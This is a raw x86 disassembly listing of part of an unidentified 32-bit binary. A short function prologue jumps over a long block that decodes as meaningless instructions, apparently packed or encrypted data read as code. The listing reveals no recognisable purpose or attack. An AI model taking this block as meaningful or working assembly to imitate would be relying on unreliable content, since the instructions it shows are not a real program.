  40f7c7:	pop    esi
  40f7c8:	pop    ebx
  40f7c9:	leave  
  40f7ca:	ret    0x8
  40f7cd:	push   ebp
  40f7ce:	mov    ebp,esp
  40f7d0:	jmp    0x40fb9a
  40f7d5:	ds cmp al,0x79
  40f7d8:	adc    BYTE PTR [ecx-0x23],bh
  40f7db:	(bad)  
  40f7dd:	dec    ebp
  40f7de:	xor    eax,0x16ba46f3
  40f7e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f7e4:	mov    al,0x5f
  40f7e6:	mov    ch,0x70
  40f7e8:	jo     0x40f78d
  40f7ea:	jge    0x40f85c
  40f7ec:	jo     0x40f80d
  40f7ee:	stc    
  40f7ef:	mov    edi,ebp
  40f7f1:	pusha  
  40f7f2:	(bad)  
  40f7f3:	leave  
  40f7f4:	enter  0x34ad,0xaf
  40f7f8:	pop    esp
  40f7f9:	js     0x40f7c9
  40f7fb:	lods   eax,DWORD PTR ds:[esi]
  40f7fc:	inc    ebp
  40f7fd:	retf   
  40f7fe:	lods   eax,DWORD PTR ds:[esi]
  40f7ff:	repnz pop eax
  40f801:	inc    edi
  40f802:	sbb    DWORD PTR [ecx+0x1eaaafcc],edi
  40f808:	mov    dl,BYTE PTR [ebp-0x5707844b]
  40f80e:	(bad)  
  40f80f:	nop
  40f810:	hlt    
  40f811:	xor    al,0x98
  40f813:	gs inc edx
  40f816:	lods   al,BYTE PTR ds:[esi]
  40f817:	dec    ebp
  40f818:	jbe    0x40f82c
  40f81a:	xlat   BYTE PTR ds:[ebx]
  40f81b:	mov    eax,ds:0x54963e9a
  40f820:	push   cs
  40f821:	les    eax,FWORD PTR [eax+0x23]
  40f824:	lea    esp,[ecx-0x6f93af9b]
  40f82a:	clc    
  40f82b:	sub    ah,BYTE PTR [ecx+esi*8]
  40f82e:	mov    ds:0x688c25ef,eax
  40f833:	fnstsw WORD PTR [esi]
  40f835:	inc    eax
  40f836:	hlt    
  40f837:	pop    ebp
  40f838:	inc    ebp
  40f839:	push   ebp
  40f83a:	dec    esp
  40f83b:	push   ds
  40f83c:	scas   eax,DWORD PTR es:[edi]
  40f83d:	pop    esi
  40f83e:	or     DWORD PTR [eax-0x4e],esp
  40f841:	and    DWORD PTR [ebx+0x3a],0x7509fcd1
  40f848:	or     BYTE PTR [eax+0x788b6ff9],bl
  40f84e:	dec    ecx
  40f84f:	inc    ecx
  40f850:	or     DWORD PTR [edx-0x36],edx
  40f853:	sti    
  40f854:	test   al,0x88
  40f856:	mov    ?,esp
  40f858:	mov    ch,0x9c
  40f85a:	(bad)  
  40f85b:	into   
  40f85c:	js     0x40f8be
  40f85e:	js     0x40f857
  40f860:	stos   BYTE PTR es:[edi],al
  40f861:	pop    ebp
  40f862:	dec    edx
  40f863:	mov    al,ds:0xcf4c7a0a
  40f868:	rcl    BYTE PTR [esi-0x7b36d42],0xfa
  40f86f:	xor    al,0xf6
  40f872:	xchg   ecx,eax
  40f873:	mov    edi,0xc0ff4725
  40f878:	aas    
  40f879:	stos   DWORD PTR es:[edi],eax
  40f87a:	add    ebx,DWORD PTR [edi+0x35]
  40f87d:	pop    edi
  40f87e:	rcl    dl,0x22
  40f881:	addr16 stc 
  40f883:	mov    bh,BYTE PTR ds:0x329a6
  40f889:	mov    BYTE PTR [edx+0xf35e8b],dh
  40f88f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f890:	das    
  40f891:	pop    ss
  40f892:	call   0x516f:0xc974bbc7
  40f899:	cmp    eax,0x67574217
  40f89e:	mov    ah,0x77
  40f8a0:	add    esp,edi
  40f8a2:	scas   al,BYTE PTR es:[edi]
  40f8a3:	pop    ss
  40f8a4:	ss push eax
  40f8a6:	adc    BYTE PTR [ebp-0x22],0xbf
  40f8aa:	push   esp
  40f8ab:	xlat   BYTE PTR ds:[ebx]
  40f8ac:	sub    DWORD PTR [ebx-0x301bd74a],esp
  40f8b2:	inc    esp
  40f8b3:	mov    BYTE PTR [edx],dh
  40f8b5:	jp     0x40f876
  40f8b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f8b8:	or     DWORD PTR [eax+0x36d1abcc],eax
  40f8be:	mov    al,ds:0x8a0c93a3
  40f8c3:	inc    edx
  40f8c4:	fpatan 
  40f8c6:	in     eax,0x77
  40f8c8:	inc    ecx
  40f8c9:	sar    DWORD PTR [esi],1
  40f8cb:	test   bh,0xee
  40f8ce:	mov    edi,0xb9936a3d
  40f8d3:	mov    bh,0x94
  40f8d5:	retf   0xd70b
  40f8d8:	dec    esp
  40f8d9:	cmp    al,0xf9
  40f8db:	je     0x40f94e
  40f8dd:	setae  BYTE PTR [edx]
  40f8e0:	push   edi
  40f8e1:	mov    dh,0x85
  40f8e3:	cmp    bh,cl
  40f8e5:	pop    esi
  40f8e6:	sub    eax,0xbe2e6a4e
  40f8eb:	sub    eax,0x2db3f01c
  40f8f0:	aam    0x11
  40f8f2:	dec    edx
  40f8f3:	pop    edi
  40f8f4:	mov    bl,0xff
  40f8f6:	add    ch,BYTE PTR [eax+0x7a]
  40f8f9:	adc    DWORD PTR [ebx-0x652c6d03],esi
  40f8ff:	jp     0x40f92f
  40f901:	jno    0x40f89f
  40f903:	add    BYTE PTR [edx],al
  40f905:	adc    ah,dh
  40f907:	dec    ebx
  40f908:	hlt    
  40f909:	and    DWORD PTR [esp+eiz*8],ebp
  40f90c:	shr    BYTE PTR [edi-0x24c3383c],0xac
  40f913:	pop    ecx
  40f914:	mov    ds:0xa2a7490f,al
  40f919:	or     BYTE PTR [ebp-0x15],0x67
  40f91d:	cmp    ah,BYTE PTR [ebx+0x24885777]
  40f923:	aas    
  40f924:	sbb    al,BYTE PTR [edi+0x43b3e843]
  40f92a:	mov    eax,0x784a4e4c
  40f92f:	aaa    
  40f930:	jne    0x40f99a
  40f932:	(bad)  
  40f933:	pop    eax
  40f934:	or     dl,BYTE PTR [ebx+0x7b1737b7]
  40f93a:	dec    esi
  40f93b:	arpl   WORD PTR [esi],cx
  40f93d:	xor    DWORD PTR [ecx+0x53c37cf4],esi
  40f943:	hlt    
  40f944:	dec    edi
  40f945:	mov    al,0xd4
  40f947:	sub    BYTE PTR [edx],0xff
  40f94a:	xor    al,cl
  40f94c:	mov    edi,0xfd304d2e
  40f951:	fcom   st(6)
  40f953:	fdivr  st(1),st
  40f955:	fisttp WORD PTR [esi-0x3c09cb5c]
  40f95b:	and    DWORD PTR [edx+0xc417013],ecx
  40f961:	pop    eax
  40f962:	or     BYTE PTR [ebp+0x2dcdde0c],dl
  40f968:	jg     0x40f975
  40f96a:	gs mov bl,0xf6
  40f96d:	cmp    eax,DWORD PTR [edx-0x7f]
  40f970:	and    dl,BYTE PTR [eax-0x569e9201]
  40f976:	pop    ebp
  40f977:	and    al,BYTE PTR gs:[edx-0x3c]
  40f97b:	inc    ebx
  40f97c:	mov    ecx,eax
  40f97e:	add    al,0x7e
  40f980:	(bad)  
  40f981:	pop    ss
  40f982:	inc    esi
  40f983:	lock test BYTE PTR gs:[ecx+0x38],0x87
  40f989:	dec    edx
  40f98a:	push   esp
  40f98b:	cmp    eax,0xc1c76843
  40f990:	mov    ecx,ds
  40f992:	push   ebx
  40f993:	outs   dx,BYTE PTR ds:[esi]
  40f994:	mov    ch,0xd2
  40f996:	js     0x40f926
  40f998:	and    cl,BYTE PTR [ebx+0x21bc951e]
  40f99e:	push   ecx
  40f99f:	push   ecx
  40f9a0:	(bad)  
  40f9a1:	cli    
  40f9a2:	push   edi
  40f9a3:	push   ebp
  40f9a4:	loop   0x40f938
  40f9a6:	sbb    eax,0x73b0edf0
  40f9ab:	jl     0x40f992
  40f9ad:	fidivr DWORD PTR [eax+0x39]
  40f9b0:	lods   eax,DWORD PTR ds:[esi]
  40f9b1:	and    ecx,esp
  40f9b3:	jg     0x40f9f7
  40f9b5:	int3   
  40f9b6:	gs jge 0x40f9ec
  40f9b9:	fst    DWORD PTR [esi-0x78]
  40f9bc:	sti    
  40f9bd:	mov    ds:0x72b893e9,al
  40f9c2:	inc    ecx
  40f9c3:	ins    DWORD PTR es:[edi],dx
  40f9c4:	mov    WORD PTR [ecx-0x26],gs
  40f9c7:	mov    ebx,0x1d034217
  40f9cc:	scas   al,BYTE PTR es:[edi]
  40f9cd:	push   cs
  40f9ce:	mov    esi,edi
  40f9d0:	fld    TBYTE PTR [ebx]
  40f9d2:	xchg   edx,eax
  40f9d3:	pop    ebx
  40f9d4:	loopne 0x40fa35
  40f9d6:	jecxz  0x40fa1e
  40f9d8:	and    DWORD PTR [edx+0x130d22a2],ebx
  40f9de:	push   edx
  40f9df:	div    DWORD PTR [ebp-0x3be94c19]
  40f9e5:	push   0xffffffe2
  40f9e7:	out    dx,al
  40f9e8:	inc    ecx
  40f9e9:	hlt    
  40f9ea:	jne    0x40fa4e
  40f9ec:	xor    dl,bh
  40f9ee:	add    eax,0x92e89e33
  40f9f3:	cs cdq 
  40f9f5:	arpl   WORD PTR [esi],bp
  40f9f7:	hlt    
  40f9f8:	adc    BYTE PTR [ecx-0x54eb1f4b],dl
  40f9fe:	mov    dh,0x5e
  40fa00:	daa    
  40fa01:	mov    esp,DWORD PTR [ecx]
  40fa03:	rcl    ch,0xa4
  40fa06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fa07:	inc    edx
  40fa08:	repnz xchg edi,eax
  40fa0a:	fild   DWORD PTR [edi]
  40fa0c:	fisttp WORD PTR [ebx+ebx*2-0x1b12aa4]
  40fa13:	cli    
  40fa14:	sub    esp,eax
  40fa16:	jle    0x40f9ca
  40fa18:	xchg   ebx,eax
  40fa19:	dec    edx
  40fa1a:	jbe    0x40fa5b
  40fa1c:	jb     0x40fa99
  40fa1e:	cmp    eax,0x2c183050
  40fa23:	pop    ebp
  40fa24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fa25:	imul   DWORD PTR [ecx]
  40fa27:	xchg   ebx,eax
  40fa28:	mov    ds:0xfbae0c1,al
  40fa2d:	push   0xffffff8d
  40fa2f:	or     dl,BYTE PTR [ebx+0x3]
  40fa32:	frstor [ebx-0x6f]
  40fa35:	loop   0x40fa61
  40fa37:	xor    eax,0x9ccd8701
  40fa3c:	jmp    0x40f9ed
  40fa3e:	jge    0x40fa43
  40fa40:	xchg   esp,edi
  40fa42:	mov    ah,0x9b
  40fa44:	mov    DWORD PTR [eax+0x643c798e],edi
  40fa4a:	xchg   edi,eax
  40fa4b:	push   edi
  40fa4c:	push   esi
  40fa4d:	shr    BYTE PTR [eax-0x17],0x41
  40fa51:	dec    ebx
  40fa52:	lea    ebx,[eax]
  40fa54:	stos   DWORD PTR es:[edi],eax
  40fa55:	cdq    
  40fa56:	imul   edi,DWORD PTR [ebx+0x0],0x53
  40fa5a:	sbb    bl,BYTE PTR [edi+ecx*2+0x42566e6b]
  40fa61:	push   cs
  40fa62:	leave  
  40fa63:	add    eax,0xc3170a19
  40fa68:	int    0xb6
  40fa6a:	xor    al,BYTE PTR [edx-0x6443b8d7]
  40fa70:	pop    ecx
  40fa71:	push   cs
  40fa72:	and    cl,dh
  40fa74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fa75:	scas   al,BYTE PTR es:[edi]
  40fa76:	mul    DWORD PTR [edx]
  40fa78:	xor    DWORD PTR [eax],0xffffffd6
  40fa7b:	sub    al,0xfd
  40fa7d:	jl     0x40faa8
  40fa7f:	imul   eax,DWORD PTR [edi-0x63],0x52
  40fa83:	out    0x42,al
  40fa85:	pop    edi
  40fa86:	iret   
  40fa87:	jns    0x40fad1
  40fa89:	rcr    BYTE PTR [ecx+0x67],0x5e
  40fa8d:	push   es
  40fa8e:	ror    DWORD PTR [ebp-0x18cf9eb3],1
  40fa94:	pop    es
  40fa95:	mov    eax,ds:0x301493df
  40fa9a:	sbb    BYTE PTR [edi+eiz*4],bh
  40fa9d:	cs loopne 0x40fad9
  40faa0:	cdq    
  40faa1:	ret    
  40faa2:	jle    0x40fa9b
  40faa4:	push   edi
  40faa5:	test   cl,ch
  40faa7:	pop    ebp
  40faa8:	or     esi,DWORD PTR ds:0xdb77550d
  40faae:	mov    al,0xeb
  40fab0:	adc    BYTE PTR [ecx],dl
  40fab2:	imul   esi,ecx,0x6
  40fab5:	ror    BYTE PTR [esi+0x26c5bb50],cl
  40fabb:	mov    ah,0x79
  40fabd:	sbb    bl,BYTE PTR [ecx]
  40fabf:	sub    ah,BYTE PTR [ebp+0x78]
  40fac2:	pop    ds
  40fac3:	pop    eax
  40fac4:	xor    al,BYTE PTR [eax-0x3721cae1]
  40faca:	mov    dh,0x99
  40facc:	imul   esi,DWORD PTR [ecx+0x53805a7f],0x17f7598f
  40fad6:	jne    0x40fb04
  40fad8:	sbb    edx,DWORD PTR [ebx]
  40fada:	xor    dh,bl
  40fadc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fadd:	sub    al,0xa
  40fadf:	xchg   ebx,eax
  40fae1:	mov    dl,0xaa
  40fae3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fae4:	add    eax,0x2e126c76
  40fae9:	sbb    DWORD PTR [ebp-0x47],ebp
  40faec:	push   eax
  40faed:	xor    DWORD PTR ds:0xc10fe4eb,esi
  40faf3:	(bad)  
  40faf4:	sbb    BYTE PTR [edx+eiz*1+0x35766296],bh
  40fafb:	add    BYTE PTR [esi*1+0x72f74c3b],ah
  40fb02:	pop    esp
  40fb03:	pushf  
  40fb04:	imul   BYTE PTR [edx+0x3c]
  40fb07:	(bad)  
  40fb08:	test   eax,0x5db9ff9a
  40fb0d:	jmp    0x27e2049a
  40fb12:	push   ecx
  40fb13:	out    0x78,al
  40fb15:	mov    ds:0x3e687f74,eax
  40fb1a:	jl     0x40faaa
  40fb1c:	pop    edx
  40fb1d:	imul   esi,DWORD PTR [esi-0x267b875e],0x74352760
  40fb27:	push   ss
  40fb28:	imul   eax,edx,0x807f0329
  40fb2e:	(bad)  
  40fb2f:	std    
  40fb30:	mov    al,ds:0xcd57c3f6
  40fb35:	push   ds
  40fb36:	faddp  st(4),st
  40fb38:	sbb    BYTE PTR [eax+0x7d],bl
  40fb3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fb3c:	xchg   esi,eax
  40fb3d:	pushf  
  40fb3e:	pusha  
  40fb3f:	pop    es
  40fb40:	jb     0x40fb36
  40fb42:	and    eax,0x6fdaccfc
  40fb47:	clc    
  40fb48:	pop    esp
  40fb49:	(bad)  
  40fb4a:	call   0x21c662a0
  40fb4f:	outs   dx,DWORD PTR ds:[esi]
  40fb50:	arpl   WORD PTR [eax],si
  40fb52:	inc    esp
  40fb53:	clc    
  40fb54:	aam    0x8
  40fb56:	cmp    eax,0x5931cce2
  40fb5b:	sub    esi,esi
  40fb5d:	scas   eax,DWORD PTR es:[edi]
  40fb5e:	adc    BYTE PTR [ebx+ebp*2+0xc2dd0fe],bl
  40fb65:	(bad)
  40fb68:	jg     0x40fb51
  40fb6a:	cmp    esp,DWORD PTR [ebp*2+0x1aedee0e]
  40fb71:	mov    esp,ss
  40fb73:	xchg   ebx,eax
  40fb74:	mov    dh,0x55
  40fb76:	inc    ecx
  40fb77:	dec    eax
  40fb78:	push   0xfe4f003f
  40fb7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fb7e:	jno    0x40fb86
  40fb80:	call   0xf04565b4
  40fb85:	inc    ebp
  40fb86:	cmp    al,0xaf
  40fb88:	ss inc ebx
  40fb8a:	sqrtps xmm2,XMMWORD PTR [edi+eiz*2-0x54]
  40fb8f:	add    esp,0xffffffae
  40fb92:	or     edx,DWORD PTR [edx-0x63]
  40fb95:	clc    
  40fb96:	les    ecx,FWORD PTR [eax-0x8ae7edc]
  40fb9c:	sbb    eax,0x42e224
  40fba1:	jmp    0x40ff6b
  40fba6:	mov    ebp,ecx
  40fba8:	cli    
  40fba9:	xor    DWORD PTR [edx-0x648a4e8f],edi
  40fbaf:	test   BYTE PTR [ebp-0x51],0xe
  40fbb3:	fidivr WORD PTR [ecx-0x4]
  40fbb6:	xor    BYTE PTR [ecx+0x7da37070],0x70
  40fbbd:	jo     0x40fb91
  40fbbf:	jb     0x40fbad
  40fbc1:	cmp    DWORD PTR [edx+0x10],ebp
  40fbc4:	sub    bh,dl
  40fbc6:	jecxz  0x40fb5b
  40fbc8:	leave  
  40fbc9:	cli    
  40fbca:	sbb    al,0xb
  40fbcc:	int3   
  40fbcd:	std    
  40fbce:	cmc    
  40fbcf:	or     eax,0x3563bd30
  40fbd4:	xchg   BYTE PTR [ecx+0x426476],ch
  40fbda:	inc    esi
  40fbdb:	outs   dx,DWORD PTR ds:[esi]
  40fbdc:	inc    ecx
  40fbdd:	pushf  
  40fbde:	jl     0x40fc2d
  40fbe0:	xor    esi,eax
  40fbe2:	pop    ss
  40fbe3:	sbb    ah,BYTE PTR [edi-0x3f5dbf88]
  40fbe9:	js     0x40fb6b
  40fbeb:	mov    esp,0x3a663bf1
  40fbf0:	pop    esi
  40fbf1:	jo     0x40fbe1
  40fbf3:	mov    edx,0xb680828f
  40fbf8:	(bad)  
  40fbf9:	repz gs pop es
  40fbfc:	xlat   BYTE PTR ds:[ebx]
  40fbfd:	inc    eax
  40fbfe:	dec    esp
  40fbff:	ror    DWORD PTR [ebp+0x7],0xa0
  40fc03:	inc    ecx
  40fc05:	gs aaa 
  40fc07:	(bad)  
  40fc08:	ret    
  40fc09:	call   0x7853:0x17536fd4
  40fc10:	adc    eax,0x7b9f637
  40fc15:	lahf   
  40fc16:	in     al,0x33
  40fc18:	les    ecx,FWORD PTR [ebp+0x2cbf98d2]
  40fc1e:	sbb    ebx,DWORD PTR [edi+ebx*4]
  40fc21:	push   0x1e
  40fc23:	adc    DWORD PTR [ebx],esi
  40fc25:	out    dx,al
  40fc26:	mov    ds:0xa611c1cb,al
  40fc2b:	add    BYTE PTR [eax],0x96
  40fc2e:	xor    edi,edi
  40fc30:	pop    edx
  40fc31:	pop    ss
  40fc32:	sbb    BYTE PTR [eax],0xdb
  40fc35:	sbb    esi,DWORD PTR [ecx-0x70]
  40fc38:	(bad)  
  40fc39:	js     0x40fc60
  40fc3b:	out    0x5c,eax
  40fc3d:	pusha  
  40fc3e:	es rcl ebp,0x54
  40fc42:	mov    dl,0x55
  40fc44:	inc    ebx
  40fc45:	stc    
  40fc46:	mov    dl,0x8e
  40fc48:	push   ebx
  40fc49:	xchg   esp,eax
  40fc4a:	push   es
  40fc4b:	xor    dh,BYTE PTR [edi]
  40fc4d:	test   al,0xc2
  40fc4f:	in     eax,0xba
  40fc51:	out    0xed,al
  40fc53:	mov    BYTE PTR [edx+0x1],bh
  40fc56:	cmp    eax,0xa4bd0397
  40fc5b:	mov    dh,0xce
  40fc5d:	mov    eax,ds:0xcf2055e5
  40fc62:	out    dx,al
  40fc63:	jmp    0xfac302c6
  40fc68:	(bad)  
  40fc6a:	push   eax
  40fc6b:	push   edi
  40fc6c:	inc    edi
  40fc6d:	rol    DWORD PTR [ebx+edi*2],0xb3
  40fc71:	(bad)  
  40fc72:	lods   eax,DWORD PTR ds:[esi]
  40fc73:	xor    BYTE PTR [eax+ebp*2],0x7a
  40fc77:	push   edi
  40fc78:	push   ds
  40fc79:	cmp    ah,BYTE PTR [edi-0x4a8400d4]
  40fc7f:	(bad)  
  40fc80:	shr    eax,0x42
  40fc83:	mov    WORD PTR [ebx-0x42],cs
  40fc86:	xor    al,BYTE PTR [esi+edx*1]
  40fc89:	stos   BYTE PTR es:[edi],al
  40fc8a:	inc    BYTE PTR [eax+eiz*8+0x1840a852]
  40fc91:	(bad)  
  40fc92:	jge    0x40fc9f
  40fc94:	and    DWORD PTR [ecx],edx
  40fc96:	(bad)  [edx+eax*8-0x15]
  40fc9a:	jp     0x40fcc4
  40fc9c:	cmc    
  40fc9d:	and    edi,DWORD PTR [edx]
  40fc9f:	mov    edi,DWORD PTR [ecx+0x6fa2b1e2]
  40fca5:	jg     0x40fc89
  40fca7:	jno    0x40fce6
  40fca9:	dec    edi
  40fcaa:	push   edx
  40fcab:	fcmovnb st,st(5)
  40fcad:	rol    BYTE PTR [eax],cl
  40fcaf:	xchg   ecx,eax
  40fcb0:	mov    al,ds:0xbdb158d1
  40fcb5:	xchg   esi,eax
  40fcb6:	jbe    0x40fc3b
  40fcb8:	ins    DWORD PTR es:[edi],dx
  40fcb9:	ins    DWORD PTR es:[edi],dx
  40fcba:	sbb    DWORD PTR [ecx],ebp
  40fcbc:	retf   
  40fcbd:	xlat   BYTE PTR ds:[ebx]
  40fcbe:	inc    ecx
  40fcbf:	das    
  40fcc0:	ret    
  40fcc1:	mov    al,ds:0xb6821578
  40fcc6:	mov    edx,0x9477aed1
  40fccb:	add    DWORD PTR [edx+ecx*4+0xb],edx
  40fccf:	inc    edi
  40fcd0:	fbstp  TBYTE PTR [edi+edi*1+0x3f]
  40fcd4:	ss retf 
  40fcd6:	cmp    al,0xf3
  40fcd8:	ja     0x40fd23
  40fcda:	or     bh,al
  40fcdc:	test   DWORD PTR [ebp-0x7c],edi
  40fcdf:	fstp   TBYTE PTR ds:0x8ec00f3
  40fce5:	dec    ebx
  40fce6:	jecxz  0x40fc89
  40fce8:	mov    ecx,0xf2c16405
  40fced:	out    dx,eax
  40fcee:	pop    edx
  40fcef:	cmp    ah,BYTE PTR [eax+eiz*4+0x71]
  40fcf3:	or     eax,0xe6e5131d
  40fcf8:	xlat   BYTE PTR ds:[ebx]
  40fcf9:	and    eax,0x52d096bb
  40fcfe:	into   
  40fcff:	sbb    DWORD PTR [edi-0x63],eax
  40fd02:	popf   
  40fd03:	add    BYTE PTR [ebx+ebx*8-0x7b],ch
  40fd07:	sbb    BYTE PTR [ecx+0x59],0x2a
  40fd0b:	mov    ebp,ecx
  40fd0d:	jmp    0xed38:0xd68d05a
  40fd14:	lods   al,BYTE PTR ds:[esi]
  40fd15:	inc    esp
  40fd16:	imul   ebp,DWORD PTR [eax+0x58492de4],0xffffffd2
  40fd1d:	or     eax,0xba3a0d51
  40fd22:	dec    esi
  40fd23:	mov    al,0x6d
  40fd25:	sub    al,0x62
  40fd27:	add    cl,cl
  40fd29:	lahf   
  40fd2a:	mov    eax,ds:0x3b7bfa58
  40fd2f:	and    DWORD PTR [edi+0x5d],ebx
  40fd32:	test   al,0x1c
  40fd34:	sbb    al,BYTE PTR [ecx+0x4e]
  40fd37:	fs pusha 
  40fd39:	mov    WORD PTR [edx+0x56],?
  40fd3c:	push   esi
  40fd3d:	aad    0x2b
  40fd3f:	ror    BYTE PTR [edi],cl
  40fd41:	add    bh,BYTE PTR [ebx+0x103aa40f]
  40fd47:	test   al,0xee
  40fd49:	rcr    DWORD PTR [edi+eax*4-0x359ac6be],1
  40fd50:	cmp    eax,0x1208b4a9
  40fd55:	xor    eax,0xc24f175f
  40fd5a:	mov    ebp,DWORD PTR [eax+0x182e04a5]
  40fd60:	into   
  40fd61:	lods   eax,DWORD PTR ds:[esi]
  40fd62:	int3   
  40fd63:	jg     0x40fd3e
  40fd65:	inc    esi
  40fd66:	push   edi
  40fd67:	push   es
  40fd68:	add    DWORD PTR [eax-0x2b],ebx
  40fd6b:	or     al,0xff
  40fd6d:	aam    0x5d
  40fd6f:	push   edx
  40fd70:	ror    BYTE PTR [esi],1
  40fd72:	jnp    0x40fd24
  40fd74:	xlat   BYTE PTR ds:[ebx]
  40fd75:	imul   BYTE PTR [eax+0x32]
  40fd78:	shl    DWORD PTR [bp+0x62e7],cl
  40fd7d:	push   ebp
  40fd7e:	imul   ecx,eax,0xffffffdb
  40fd81:	push   eax
  40fd82:	into   
  40fd83:	sbb    BYTE PTR [ecx+eax*4-0x37c8e7f4],ch
  40fd8a:	xchg   ebx,eax
  40fd8b:	in     eax,0x35
  40fd8d:	push   eax
  40fd8e:	xchg   BYTE PTR [ecx+0x53],bl
  40fd91:	mov    edx,0x1ed26c5c
  40fd96:	lds    ebp,FWORD PTR [eax+ebp*1]
  40fd99:	nop
  40fd9a:	dec    esi
  40fd9b:	sbb    eax,0x5a079908
  40fda0:	xor    eax,DWORD PTR [edx+0x1b]
  40fda3:	xchg   edx,eax
  40fda4:	cmp    edx,esi
  40fda6:	jmp    0xb21e:0x8a7c7ce
  40fdad:	mov    ebx,0x1489b24a
  40fdb2:	or     DWORD PTR [esi-0x289a3244],ecx
  40fdb8:	jbe    0x40fd58
  40fdba:	dec    edx
  40fdbb:	mov    al,0xcd
  40fdbd:	push   esi
  40fdbe:	popa   
  40fdbf:	xor    dl,dl
  40fdc1:	xor    edx,edx
  40fdc3:	jae    0x40fd47
  40fdc5:	push   ebp
  40fdc6:	xor    DWORD PTR ds:0xed5ca86c,0xffffffa7
  40fdcd:	push   0x4b
  40fdcf:	dec    ebx
  40fdd0:	xchg   ebp,eax
  40fdd1:	inc    edx
  40fdd2:	(bad)  [ebp+0x30]
  40fdd5:	cmp    al,BYTE PTR [edx+0x1990c184]
  40fddb:	or     cl,BYTE PTR [esi-0x4f]
  40fdde:	into   
  40fddf:	push   ecx
  40fde0:	sar    DWORD PTR [ebp+0x61a2b000],1
  40fde6:	mov    ebx,0x32e1458c
  40fdeb:	and    eax,0xb8083ccb
  40fdf0:	add    BYTE PTR [edi-0x6dc7ad18],0xa9
  40fdf7:	loope  0x40fda2
  40fdf9:	push   0x63
  40fdfb:	or     al,0xdb
  40fdfd:	push   ss
  40fdfe:	es add BYTE PTR ss:0x89dca17e,ah
  40fe06:	pop    ebp
  40fe07:	popa   
  40fe08:	sub    eax,0x4ccfe821
  40fe0d:	add    ebp,0xcc627d1a
  40fe13:	test   BYTE PTR [ebx+0x6f],0x9d
  40fe17:	aad    0x6
  40fe19:	mul    DWORD PTR [edi+0x60438d]
  40fe1f:	or     eax,ecx
  40fe21:	in     eax,0x34
  40fe23:	adc    DWORD PTR [eax-0x12],0x71
  40fe27:	stc    
  40fe28:	jmp    0x40fe50
  40fe2a:	add    edi,ecx
  40fe2c:	mov    edx,0x3494278d
  40fe31:	jg     0x40fe37
  40fe33:	cmp    eax,0x2357c890
  40fe38:	mov    bl,0xf1
  40fe3a:	jl     0x40feb1
  40fe3c:	ficom  WORD PTR [esp+eiz*8-0x4a8926a8]
  40fe43:	add    edx,eax
  40fe45:	ror    ecx,0x68
  40fe48:	out    dx,al
  40fe49:	stos   DWORD PTR es:[edi],eax
  40fe4a:	jmp    0xc183eba7
  40fe4f:	mov    esp,0x88bfe637
  40fe54:	or     eax,0x8ec6e9b8
  40fe59:	pop    ebx
  40fe5a:	retf   0xabdd
  40fe5d:	dec    ecx
  40fe5e:	jbe    0x40fe74
  40fe60:	and    al,0x30
  40fe62:	adc    DWORD PTR [ebx+0x43],ecx
  40fe65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fe66:	jno    0x40fe35
  40fe68:	mov    ebp,0xcbe41959
  40fe6d:	and    DWORD PTR [eax-0x20],edi
  40fe70:	sub    dl,BYTE PTR [edx-0x810b4e2]
  40fe76:	call   0xce6e4d8a
  40fe7b:	arpl   WORD PTR [ebx-0x1e5e0999],si
  40fe81:	xchg   ebp,eax
  40fe82:	cld    
  40fe83:	fld    QWORD PTR [ebp-0x53]
  40fe86:	aam    0xb0
  40fe88:	cld    
  40fe89:	or     al,0x45
  40fe8b:	inc    esp
  40fe8c:	aad    0xe3
  40fe8e:	daa    
  40fe8f:	retf   
  40fe90:	and    bl,al
  40fe92:	in     al,dx
  40fe93:	mov    ah,0xca
  40fe95:	aas    
  40fe96:	mov    WORD PTR [esi],ds
  40fe98:	push   es
  40fe99:	mov    edi,0x81969ac8
  40fe9e:	lahf   
  40fe9f:	call   0xb3060e6a
  40fea4:	fidiv  WORD PTR [edi-0x61]
  40fea7:	sub    ebp,ecx
  40fea9:	sub    esi,0xe617c1eb
  40feaf:	lds    eax,FWORD PTR [ecx+0x2]
  40feb2:	(bad)  
  40feb3:	js     0x40fee7
  40feb5:	(bad)  
  40feb6:	fsubr  DWORD PTR [eax-0x25]
  40feb9:	addr16 retf 0x527b
  40febd:	cdq    
  40febe:	dec    ecx
  40febf:	push   ebx
  40fec0:	leave  
  40fec1:	ss jne 0x40ff3b
  40fec4:	outs   dx,DWORD PTR ds:[esi]
  40fec5:	test   dl,ch
  40fec7:	mov    ds:0x2f684611,eax
  40fecc:	jecxz  0x40fe80
  40fece:	and    eax,0x160278d6
  40fed3:	jle    0x40ff1f
  40fed5:	popa   
  40fed6:	sbb    eax,0xea2b494b
  40fedb:	mov    ebp,0x1c547d09
  40fee0:	cs jne 0x40fee4
  40fee3:	push   eax
  40fee4:	jnp    0x40ff65
  40fee6:	mov    edi,0x7991f5a6
  40feeb:	mov    ch,0xa6
  40feed:	test   al,0x2c
  40feef:	stc    
  40fef0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fef1:	aas    
  40fef2:	clc    
  40fef3:	fcmovnb st,st(2)
  40fef5:	sti    
  40fef6:	add    al,BYTE PTR [eax+0x49f0f6fd]
  40fefc:	and    edx,DWORD PTR [ebp+0x7b]
  40feff:	jo     0x40febf
  40ff01:	mov    ecx,0x24d90464
  40ff06:	retf   0xb1a2
  40ff09:	pushf  
  40ff0a:	pop    ebx
  40ff0b:	xor    edx,DWORD PTR [ebx+eax*4]
  40ff0e:	arpl   WORD PTR gs:[ebp-0x59],dx
  40ff12:	in     al,0x46
  40ff14:	xor    al,0x59
  40ff16:	mov    esi,DWORD PTR [ecx+ebx*2]
  40ff19:	mov    al,0x32
  40ff1b:	lds    eax,FWORD PTR [edi]
  40ff1d:	test   eax,0x2c3e81d6
  40ff22:	outs   dx,BYTE PTR ds:[esi]
  40ff23:	mov    edx,0x322ba0ff
